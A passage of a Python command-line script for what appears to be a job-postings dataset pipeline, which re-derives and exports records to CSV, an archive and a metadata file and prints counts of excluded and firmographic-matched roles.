        filled = sum(1 for r in records.values() if r.get("seniority"))
        print(f"seniority: +{len(changed)} filled, {filled} of {len(records)} records "
              f"now carry one -> {path}", flush=True)
        return 0
    from . import firmographics as _f
    shared, fstatus = _f.load_shared_status()
    csv_path, meta_path, _fn = dataset_paths(a.db)
    earliest_run = ""
    if os.path.exists(a.db):
        st = _store.SeenStore(a.db)
        try:
            earliest_run = st.conn.execute("SELECT MIN(run_date) FROM runs").fetchone()[0] or ""
        finally:
            st.close()
    # The same call the run makes — archive, CSV, meta, Pages address — so a re-derive can
    # never publish a meta that contradicts the files beside it. It re-derives from the
    # RECORDS' statuses: a retraction line is applied by a run (`_record_run`), not here.
    rows, archived, counts, meta = export_files(
        records, a.db, run_date=a.date, firmographics=shared, window_days=a.window_days,
        earliest_run=earliest_run)
    print(f"{len(rows)} roles -> {csv_path}; {len(archived)} archived -> {archive_path(a.db)}",
          flush=True)
    print(f"  ledger {len(records)} records ({bad} bad lines), firmographics {len(shared)} "
          f"({fstatus})", flush=True)
    print(f"  window {counts['window_start']}..{counts['window_end']} on last_seen"
          f"  ({'covered' if meta['window']['fully_covered'] else 'ASPIRATIONAL'})", flush=True)
    print(f"  excluded: superseded {counts.get('superseded', 0)}, purged "
          f"{counts.get('purged', 0)}, outside window {counts.get('outside_window', 0)}, "
          f"undatable {counts.get('undatable', 0)}", flush=True)
    print(f"  firmographics matched: exact {counts.get('firmo:exact', 0)}, identity "
          f"{counts.get('firmo:identity', 0)}, none {counts.get('firmo:none', 0)}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
